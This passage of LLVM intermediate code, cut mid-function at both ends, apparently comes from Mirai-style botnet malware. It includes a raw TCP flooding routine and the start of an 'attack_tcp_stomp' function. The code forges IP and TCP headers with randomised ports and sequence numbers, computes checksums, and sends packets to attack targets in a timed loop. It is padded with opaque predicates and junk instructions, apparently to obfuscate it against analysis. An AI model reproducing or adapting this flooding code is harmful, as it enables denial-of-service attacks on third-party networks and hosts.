originalBB249:                                    ; preds = %originalBB249alteredBB, %579
  %588 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 7
  store i16 0, i16* %589, align 2
  %590 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %591 = bitcast %struct.iphdr* %590 to i16*
  %592 = call zeroext i16 @checksum_generic(i16* %591, i32 20)
  %593 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %594 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %593, i32 0, i32 7
  store i16 %592, i16* %594, align 2
  %595 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 6
  store i16 0, i16* %596, align 4
  %597 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %598 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %599 = bitcast %struct.tcphdr* %598 to i8*
  %600 = load i32, i32* %28, align 4
  %601 = sext i32 %600 to i64
  %602 = add i64 20, %601
  %603 = trunc i64 %602 to i16
  %604 = call zeroext i16 @htons(i16 zeroext %603) #7
  %605 = load i32, i32* %28, align 4
  %606 = sext i32 %605 to i64
  %607 = add i64 20, %606
  %608 = trunc i64 %607 to i32
  %609 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %597, i8* %599, i16 zeroext %604, i32 %608)
  %610 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %611 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %610, i32 0, i32 6
  store i16 %609, i16* %611, align 4
  %612 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 1
  %614 = load i16, i16* %613, align 2
  %615 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %616 = load i32, i32* %11, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %615, i64 %617
  %619 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %618, i32 0, i32 0
  %620 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %619, i32 0, i32 1
  store i16 %614, i16* %620, align 2
  %621 = load i32, i32* %12, align 4
  %622 = load i8*, i8** %35, align 8
  %623 = load i32, i32* %28, align 4
  %624 = sext i32 %623 to i64
  %625 = add i64 40, %624
  %626 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %627 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %628 = load i32, i32* %11, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %627, i64 %629
  %631 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %630, i32 0, i32 0
  %632 = bitcast %struct.sockaddr_in* %631 to %struct.sockaddr*
  store %struct.sockaddr* %632, %struct.sockaddr** %626, align 8
  %633 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %634 = load %struct.sockaddr*, %struct.sockaddr** %633, align 8
  %635 = call i64 @sendto(i32 %621, i8* %622, i64 %625, i32 16384, %struct.sockaddr* %634, i32 16)
  %636 = load i32, i32* @x.25
  %637 = load i32, i32* @y.26
  %638 = sub i32 %636, 1
  %639 = mul i32 %636, %638
  %640 = urem i32 %639, 2
  %641 = icmp eq i32 %640, 0
  %642 = icmp slt i32 %637, 10
  %643 = or i1 %641, %642
  br i1 %643, label %originalBBpart2275, label %originalBB249alteredBB

originalBBpart2275:                               ; preds = %originalBB249
  br label %644

; <label>:644:                                    ; preds = %originalBBpart2275
  %645 = load i32, i32* %11, align 4
  %646 = add nsw i32 %645, 1
  store i32 %646, i32* %11, align 4
  br label %374

; <label>:647:                                    ; preds = %374
  %648 = call i64 @time(i64* null) #6
  %649 = load i32, i32* %31, align 4
  %650 = sext i32 %649 to i64
  %651 = icmp sgt i64 %648, %650
  br i1 %651, label %652, label %669

; <label>:652:                                    ; preds = %647
  %653 = load i32, i32* @x.25
  %654 = load i32, i32* @y.26
  %655 = sub i32 %653, 1
  %656 = mul i32 %653, %655
  %657 = urem i32 %656, 2
  %658 = icmp eq i32 %657, 0
  %659 = icmp slt i32 %654, 10
  %660 = or i1 %658, %659
  br i1 %660, label %originalBB277, label %originalBB277alteredBB

originalBB277:                                    ; preds = %originalBB277alteredBB, %652
  %661 = load i32, i32* @x.25
  %662 = load i32, i32* @y.26
  %663 = sub i32 %661, 1
  %664 = mul i32 %661, %663
  %665 = urem i32 %664, 2
  %666 = icmp eq i32 %665, 0
  %667 = icmp slt i32 %662, 10
  %668 = or i1 %666, %667
  br i1 %668, label %originalBBpart2279, label %originalBB277alteredBB

originalBBpart2279:                               ; preds = %originalBB277
  br label %670

; <label>:669:                                    ; preds = %647
  br label %373

; <label>:670:                                    ; preds = %originalBBpart2279, %154, %originalBBpart2
  %671 = load i32, i32* @x.25
  %672 = load i32, i32* @y.26
  %673 = sub i32 %671, 1
  %674 = mul i32 %671, %673
  %675 = urem i32 %674, 2
  %676 = icmp eq i32 %675, 0
  %677 = icmp slt i32 %672, 10
  %678 = or i1 %676, %677
  br i1 %678, label %originalBB281, label %originalBB281alteredBB

originalBB281:                                    ; preds = %originalBB281alteredBB, %670
  %679 = load i32, i32* @x.25
  %680 = load i32, i32* @y.26
  %681 = sub i32 %679, 1
  %682 = mul i32 %679, %681
  %683 = urem i32 %682, 2
  %684 = icmp eq i32 %683, 0
  %685 = icmp slt i32 %680, 10
  %686 = or i1 %684, %685
  br i1 %686, label %originalBBpart2283, label %originalBB281alteredBB

originalBBpart2283:                               ; preds = %originalBB281
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %116
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %133
  store i32 1, i32* %11, align 4
  %687 = load i32, i32* %12, align 4
  %688 = bitcast i32* %11 to i8*
  %689 = call i32 @setsockopt(i32 %687, i32 0, i32 3, i8* %688, i32 4) #6
  %690 = icmp eq i32 %689, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %214
  %691 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %692 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %691, i32 0, i32 6
  store i8 6, i8* %692, align 1
  %693 = load i32, i32* %30, align 4
  %694 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %695 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %694, i32 0, i32 8
  store i32 %693, i32* %695, align 4
  %696 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %697 = load i32, i32* %11, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %696, i64 %698
  %700 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %699, i32 0, i32 1
  %701 = load i32, i32* %700, align 4
  %702 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %703 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %702, i32 0, i32 9
  store i32 %701, i32* %703, align 4
  %704 = load i16, i16* %18, align 2
  %705 = call zeroext i16 @htons(i16 zeroext %704) #7
  %706 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %707 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %706, i32 0, i32 0
  store i16 %705, i16* %707, align 4
  %708 = load i16, i16* %19, align 2
  %709 = call zeroext i16 @htons(i16 zeroext %708) #7
  %710 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %711 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %710, i32 0, i32 1
  store i16 %709, i16* %711, align 2
  %712 = load i32, i32* %20, align 4
  %713 = trunc i32 %712 to i16
  %714 = call zeroext i16 @htons(i16 zeroext %713) #7
  %715 = zext i16 %714 to i32
  %716 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %717 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %716, i32 0, i32 2
  store i32 %715, i32* %717, align 4
  %718 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %719 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %718, i32 0, i32 4
  %720 = load i16, i16* %719, align 4
  %_ = sub i16 0, %720
  %gen = add i16 %_, -241
  %721 = and i16 %720, -241
  %_7 = sub i16 0, %721
  %gen8 = add i16 %_7, 80
  %_9 = shl i16 %721, 80
  %_10 = sub i16 %721, 80
  %gen11 = mul i16 %_10, 80
  %_12 = sub i16 0, %721
  %gen13 = add i16 %_12, 80
  %722 = or i16 %721, 80
  store i16 %722, i16* %719, align 4
  %723 = load i8, i8* %22, align 1
  %724 = sext i8 %723 to i16
  %725 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %726 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %725, i32 0, i32 4
  %727 = load i16, i16* %726, align 4
  %_14 = shl i16 %724, 1
  %_15 = shl i16 %724, 1
  %_16 = sub i16 %724, 1
  %gen17 = mul i16 %_16, 1
  %_18 = sub i16 %724, 1
  %gen19 = mul i16 %_18, 1
  %728 = and i16 %724, 1
  %_20 = sub i16 0, %728
  %gen21 = add i16 %_20, 13
  %_22 = sub i16 0, %728
  %gen23 = add i16 %_22, 13
  %_24 = shl i16 %728, 13
  %_25 = sub i16 0, %728
  %gen26 = add i16 %_25, 13
  %_27 = sub i16 0, %728
  %gen28 = add i16 %_27, 13
  %_29 = shl i16 %728, 13
  %729 = shl i16 %728, 13
  %_30 = sub i16 %727, -8193
  %gen31 = mul i16 %_30, -8193
  %_32 = shl i16 %727, -8193
  %_33 = shl i16 %727, -8193
  %_34 = sub i16 %727, -8193
  %gen35 = mul i16 %_34, -8193
  %_36 = shl i16 %727, -8193
  %730 = and i16 %727, -8193
  %_37 = sub i16 0, %730
  %gen38 = add i16 %_37, %729
  %_39 = sub i16 0, %730
  %gen40 = add i16 %_39, %729
  %_41 = sub i16 %730, %729
  %gen42 = mul i16 %_41, %729
  %_43 = sub i16 0, %730
  %gen44 = add i16 %_43, %729
  %_45 = sub i16 0, %730
  %gen46 = add i16 %_45, %729
  %_47 = shl i16 %730, %729
  %731 = or i16 %730, %729
  store i16 %731, i16* %726, align 4
  %732 = load i8, i8* %23, align 1
  %733 = sext i8 %732 to i16
  %734 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %735 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %734, i32 0, i32 4
  %736 = load i16, i16* %735, align 4
  %_48 = shl i16 %733, 1
  %_49 = shl i16 %733, 1
  %_50 = shl i16 %733, 1
  %737 = and i16 %733, 1
  %_51 = shl i16 %737, 12
  %_52 = shl i16 %737, 12
  %_53 = sub i16 %737, 12
  %gen54 = mul i16 %_53, 12
  %_55 = shl i16 %737, 12
  %_56 = sub i16 0, %737
  %gen57 = add i16 %_56, 12
  %738 = shl i16 %737, 12
  %_58 = shl i16 %736, -4097
  %_59 = sub i16 %736, -4097
  %gen60 = mul i16 %_59, -4097
  %_61 = sub i16 %736, -4097
  %gen62 = mul i16 %_61, -4097
  %_63 = sub i16 0, %736
  %gen64 = add i16 %_63, -4097
  %739 = and i16 %736, -4097
  %_65 = sub i16 0, %739
  %gen66 = add i16 %_65, %738
  %_67 = sub i16 0, %739
  %gen68 = add i16 %_67, %738
  %_69 = shl i16 %739, %738
  %_70 = shl i16 %739, %738
  %740 = or i16 %739, %738
  store i16 %740, i16* %735, align 4
  %741 = load i8, i8* %24, align 1
  %742 = sext i8 %741 to i16
  %743 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %744 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %743, i32 0, i32 4
  %745 = load i16, i16* %744, align 4
  %_71 = sub i16 %742, 1
  %gen72 = mul i16 %_71, 1
  %_73 = shl i16 %742, 1
  %746 = and i16 %742, 1
  %_74 = shl i16 %746, 11
  %_75 = shl i16 %746, 11
  %747 = shl i16 %746, 11
  %_76 = shl i16 %745, -2049
  %_77 = sub i16 0, %745
  %gen78 = add i16 %_77, -2049
  %_79 = sub i16 %745, -2049
  %gen80 = mul i16 %_79, -2049
  %_81 = shl i16 %745, -2049
  %_82 = sub i16 0, %745
  %gen83 = add i16 %_82, -2049
  %_84 = sub i16 %745, -2049
  %gen85 = mul i16 %_84, -2049
  %748 = and i16 %745, -2049
  %_86 = shl i16 %748, %747
  %_87 = sub i16 0, %748
  %gen88 = add i16 %_87, %747
  %_89 = shl i16 %748, %747
  %_90 = sub i16 0, %748
  %gen91 = add i16 %_90, %747
  %_92 = sub i16 %748, %747
  %gen93 = mul i16 %_92, %747
  %_94 = sub i16 0, %748
  %gen95 = add i16 %_94, %747
  %_96 = shl i16 %748, %747
  %749 = or i16 %748, %747
  store i16 %749, i16* %744, align 4
  %750 = load i8, i8* %25, align 1
  %751 = sext i8 %750 to i16
  %752 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %753 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %752, i32 0, i32 4
  %754 = load i16, i16* %753, align 4
  %755 = and i16 %751, 1
  %_97 = sub i16 0, %755
  %gen98 = add i16 %_97, 10
  %_99 = shl i16 %755, 10
  %756 = shl i16 %755, 10
  %_100 = shl i16 %754, -1025
  %_101 = shl i16 %754, -1025
  %_102 = sub i16 %754, -1025
  %gen103 = mul i16 %_102, -1025
  %_104 = sub i16 0, %754
  %gen105 = add i16 %_104, -1025
  %757 = and i16 %754, -1025
  %_106 = sub i16 %757, %756
  %gen107 = mul i16 %_106, %756
  %_108 = sub i16 %757, %756
  %gen109 = mul i16 %_108, %756
  %_110 = shl i16 %757, %756
  %758 = or i16 %757, %756
  store i16 %758, i16* %753, align 4
  %759 = load i8, i8* %26, align 1
  %760 = sext i8 %759 to i16
  %761 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %762 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %761, i32 0, i32 4
  %763 = load i16, i16* %762, align 4
  %_111 = sub i16 0, %760
  %gen112 = add i16 %_111, 1
  %_113 = sub i16 0, %760
  %gen114 = add i16 %_113, 1
  %764 = and i16 %760, 1
  %_115 = sub i16 %764, 9
  %gen116 = mul i16 %_115, 9
  %_117 = sub i16 %764, 9
  %gen118 = mul i16 %_117, 9
  %_119 = shl i16 %764, 9
  %_120 = sub i16 %764, 9
  %gen121 = mul i16 %_120, 9
  %_122 = sub i16 %764, 9
  %gen123 = mul i16 %_122, 9
  %_124 = sub i16 0, %764
  %gen125 = add i16 %_124, 9
  %765 = shl i16 %764, 9
  %_126 = sub i16 0, %763
  %gen127 = add i16 %_126, -513
  %_128 = shl i16 %763, -513
  %_129 = sub i16 %763, -513
  %gen130 = mul i16 %_129, -513
  %_131 = sub i16 0, %763
  %gen132 = add i16 %_131, -513
  %766 = and i16 %763, -513
  %_133 = shl i16 %766, %765
  %_134 = shl i16 %766, %765
  %_135 = sub i16 0, %766
  %gen136 = add i16 %_135, %765
  %_137 = shl i16 %766, %765
  %_138 = shl i16 %766, %765
  %_139 = sub i16 %766, %765
  %gen140 = mul i16 %_139, %765
  %767 = or i16 %766, %765
  store i16 %767, i16* %762, align 4
  %768 = load i8, i8* %27, align 1
  %769 = sext i8 %768 to i16
  %770 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %771 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %770, i32 0, i32 4
  %772 = load i16, i16* %771, align 4
  %_141 = sub i16 %769, 1
  %gen142 = mul i16 %_141, 1
  %_143 = sub i16 %769, 1
  %gen144 = mul i16 %_143, 1
  %_145 = sub i16 %769, 1
  %gen146 = mul i16 %_145, 1
  %_147 = sub i16 0, %769
  %gen148 = add i16 %_147, 1
  %_149 = shl i16 %769, 1
  %_150 = sub i16 0, %769
  %gen151 = add i16 %_150, 1
  %_152 = shl i16 %769, 1
  %_153 = shl i16 %769, 1
  %_154 = shl i16 %769, 1
  %773 = and i16 %769, 1
  %_155 = shl i16 %773, 8
  %_156 = sub i16 %773, 8
  %gen157 = mul i16 %_156, 8
  %_158 = shl i16 %773, 8
  %_159 = shl i16 %773, 8
  %_160 = sub i16 0, %773
  %gen161 = add i16 %_160, 8
  %774 = shl i16 %773, 8
  %_162 = shl i16 %772, -257
  %_163 = shl i16 %772, -257
  %_164 = sub i16 0, %772
  %gen165 = add i16 %_164, -257
  %_166 = shl i16 %772, -257
  %775 = and i16 %772, -257
  %_167 = sub i16 0, %775
  %gen168 = add i16 %_167, %774
  %_169 = sub i16 0, %775
  %gen170 = add i16 %_169, %774
  %776 = or i16 %775, %774
  store i16 %776, i16* %771, align 4
  %777 = call i32 @rand_next()
  %_171 = shl i32 %777, 65535
  %_172 = shl i32 %777, 65535
  %_173 = sub i32 %777, 65535
  %gen174 = mul i32 %_173, 65535
  %_175 = shl i32 %777, 65535
  %_176 = sub i32 %777, 65535
  %gen177 = mul i32 %_176, 65535
  %_178 = sub i32 0, %777
  %gen179 = add i32 %_178, 65535
  %_180 = shl i32 %777, 65535
  %_181 = sub i32 0, %777
  %gen182 = add i32 %_181, 65535
  %778 = and i32 %777, 65535
  %779 = trunc i32 %778 to i16
  %780 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %781 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %780, i32 0, i32 5
  store i16 %779, i16* %781, align 2
  %782 = load i8, i8* %24, align 1
  %783 = icmp ne i8 %782, 0
  br label %originalBB6

originalBB186alteredBB:                           ; preds = %originalBB186, %337
  %784 = load i32, i32* %11, align 4
  %_187 = sub i32 0, %784
  %gen188 = add i32 %_187, 1
  %_189 = sub i32 %784, 1
  %gen190 = mul i32 %_189, 1
  %_191 = sub i32 %784, 1
  %gen192 = mul i32 %_191, 1
  %785 = add nsw i32 %784, 1
  store i32 %785, i32* %11, align 4
  br label %originalBB186

originalBB196alteredBB:                           ; preds = %originalBB196, %356
  br label %originalBB196

originalBB200alteredBB:                           ; preds = %originalBB200, %429
  %786 = load i16, i16* %15, align 2
  %787 = zext i16 %786 to i32
  %788 = icmp eq i32 %787, 65535
  br label %originalBB200

originalBB204alteredBB:                           ; preds = %originalBB204, %449
  %789 = call i32 @rand_next()
  %_205 = sub i32 %789, 65535
  %gen206 = mul i32 %_205, 65535
  %_207 = sub i32 %789, 65535
  %gen208 = mul i32 %_207, 65535
  %_209 = sub i32 0, %789
  %gen210 = add i32 %_209, 65535
  %_211 = sub i32 %789, 65535
  %gen212 = mul i32 %_211, 65535
  %_213 = shl i32 %789, 65535
  %_214 = sub i32 %789, 65535
  %gen215 = mul i32 %_214, 65535
  %_216 = shl i32 %789, 65535
  %790 = and i32 %789, 65535
  %791 = trunc i32 %790 to i16
  %792 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %793 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %792, i32 0, i32 3
  store i16 %791, i16* %793, align 4
  br label %originalBB204

originalBB220alteredBB:                           ; preds = %originalBB220, %475
  %794 = call i32 @rand_next()
  %_221 = shl i32 %794, 65535
  %_222 = shl i32 %794, 65535
  %795 = and i32 %794, 65535
  %796 = trunc i32 %795 to i16
  %797 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %798 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %797, i32 0, i32 0
  store i16 %796, i16* %798, align 4
  br label %originalBB220

originalBB226alteredBB:                           ; preds = %originalBB226, %501
  %799 = call i32 @rand_next()
  %_227 = sub i32 0, %799
  %gen228 = add i32 %_227, 65535
  %_229 = sub i32 0, %799
  %gen230 = add i32 %_229, 65535
  %_231 = sub i32 %799, 65535
  %gen232 = mul i32 %_231, 65535
  %_233 = sub i32 0, %799
  %gen234 = add i32 %_233, 65535
  %_235 = sub i32 0, %799
  %gen236 = add i32 %_235, 65535
  %_237 = shl i32 %799, 65535
  %800 = and i32 %799, 65535
  %801 = trunc i32 %800 to i16
  %802 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %803 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %802, i32 0, i32 1
  store i16 %801, i16* %803, align 2
  br label %originalBB226

originalBB241alteredBB:                           ; preds = %originalBB241, %523
  %804 = load i32, i32* %20, align 4
  %805 = icmp eq i32 %804, 65535
  br label %originalBB241

originalBB245alteredBB:                           ; preds = %originalBB245, %542
  %806 = call i32 @rand_next()
  %807 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %808 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %807, i32 0, i32 2
  store i32 %806, i32* %808, align 4
  br label %originalBB245

originalBB249alteredBB:                           ; preds = %originalBB249, %579
  %809 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %810 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %809, i32 0, i32 7
  store i16 0, i16* %810, align 2
  %811 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %812 = bitcast %struct.iphdr* %811 to i16*
  %813 = call zeroext i16 @checksum_generic(i16* %812, i32 20)
  %814 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %815 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %814, i32 0, i32 7
  store i16 %813, i16* %815, align 2
  %816 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %817 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %816, i32 0, i32 6
  store i16 0, i16* %817, align 4
  %818 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %819 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %820 = bitcast %struct.tcphdr* %819 to i8*
  %821 = load i32, i32* %28, align 4
  %822 = sext i32 %821 to i64
  %_250 = sub i64 0, 20
  %gen251 = add i64 %_250, %822
  %_252 = sub i64 20, %822
  %gen253 = mul i64 %_252, %822
  %_254 = sub i64 0, 20
  %gen255 = add i64 %_254, %822
  %_256 = sub i64 0, 20
  %gen257 = add i64 %_256, %822
  %823 = add i64 20, %822
  %824 = trunc i64 %823 to i16
  %825 = call zeroext i16 @htons(i16 zeroext %824) #7
  %826 = load i32, i32* %28, align 4
  %827 = sext i32 %826 to i64
  %_258 = shl i64 20, %827
  %_259 = shl i64 20, %827
  %828 = add i64 20, %827
  %829 = trunc i64 %828 to i32
  %830 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %818, i8* %820, i16 zeroext %825, i32 %829)
  %831 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %832 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %831, i32 0, i32 6
  store i16 %830, i16* %832, align 4
  %833 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %834 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %833, i32 0, i32 1
  %835 = load i16, i16* %834, align 2
  %836 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %837 = load i32, i32* %11, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %836, i64 %838
  %840 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %839, i32 0, i32 0
  %841 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %840, i32 0, i32 1
  store i16 %835, i16* %841, align 2
  %842 = load i32, i32* %12, align 4
  %843 = load i8*, i8** %35, align 8
  %844 = load i32, i32* %28, align 4
  %845 = sext i32 %844 to i64
  %_260 = sub i64 40, %845
  %gen261 = mul i64 %_260, %845
  %_262 = sub i64 0, 40
  %gen263 = add i64 %_262, %845
  %_264 = shl i64 40, %845
  %_265 = shl i64 40, %845
  %_266 = shl i64 40, %845
  %_267 = shl i64 40, %845
  %_268 = sub i64 0, 40
  %gen269 = add i64 %_268, %845
  %_270 = sub i64 0, 40
  %gen271 = add i64 %_270, %845
  %_272 = sub i64 0, 40
  %gen273 = add i64 %_272, %845
  %846 = add i64 40, %845
  %847 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %848 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %849 = load i32, i32* %11, align 4
  %850 = sext i32 %849 to i64
  %851 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %848, i64 %850
  %852 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %851, i32 0, i32 0
  %853 = bitcast %struct.sockaddr_in* %852 to %struct.sockaddr*
  store %struct.sockaddr* %853, %struct.sockaddr** %847, align 8
  %854 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %855 = load %struct.sockaddr*, %struct.sockaddr** %854, align 8
  %856 = call i64 @sendto(i32 %842, i8* %843, i64 %846, i32 16384, %struct.sockaddr* %855, i32 16)
  br label %originalBB249

originalBB277alteredBB:                           ; preds = %originalBB277, %652
  br label %originalBB277

originalBB281alteredBB:                           ; preds = %originalBB281, %670
  br label %originalBB281
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.27
  %7 = load i32, i32* @y.28
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.attack_stomp_data*, align 8
  %22 = alloca i8**, align 8
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i16, align 2
  %28 = alloca i8, align 1
  %29 = alloca i8, align 1
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i32, align 4
  %35 = alloca i8, align 1
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca %struct.sockaddr_in, align 4
  %39 = alloca %struct.sockaddr_in, align 4
  %40 = alloca i32, align 4
  %41 = alloca [256 x i8], align 16
  %42 = alloca i64, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %44 = alloca i32, align 4
  %45 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %46 = alloca %struct.tcphdr*, align 8
  %47 = alloca %struct.iphdr*, align 8
  %48 = alloca %struct.tcphdr*, align 8
  %49 = alloca i8*, align 8
  %50 = alloca i8*, align 8
  %51 = alloca %struct.iphdr*, align 8
  %52 = alloca %struct.tcphdr*, align 8
  %53 = alloca i8*, align 8
  %54 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %55 = load i8, i8* %15, align 1
  %56 = zext i8 %55 to i64
  %57 = call noalias i8* @calloc(i64 %56, i64 16) #6
  %58 = bitcast i8* %57 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %58, %struct.attack_stomp_data** %21, align 8
  %59 = load i8, i8* %15, align 1
  %60 = zext i8 %59 to i64
  %61 = call noalias i8* @calloc(i64 %60, i64 8) #6
  %62 = bitcast i8* %61 to i8**
  store i8** %62, i8*** %22, align 8
  %63 = load i8, i8* %17, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 2, i32 0)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %23, align 1
  %67 = load i8, i8* %17, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 3, i32 65535)
  %70 = trunc i32 %69 to i16
  store i16 %70, i16* %24, align 2
  %71 = load i8, i8* %17, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 4, i32 64)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %25, align 1
  %75 = load i8, i8* %17, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 5, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %26, align 1
  %79 = load i8, i8* %17, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 65535)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %27, align 2
  %83 = load i8, i8* %17, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 10, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %28, align 1
  %87 = load i8, i8* %17, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 11, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %29, align 1
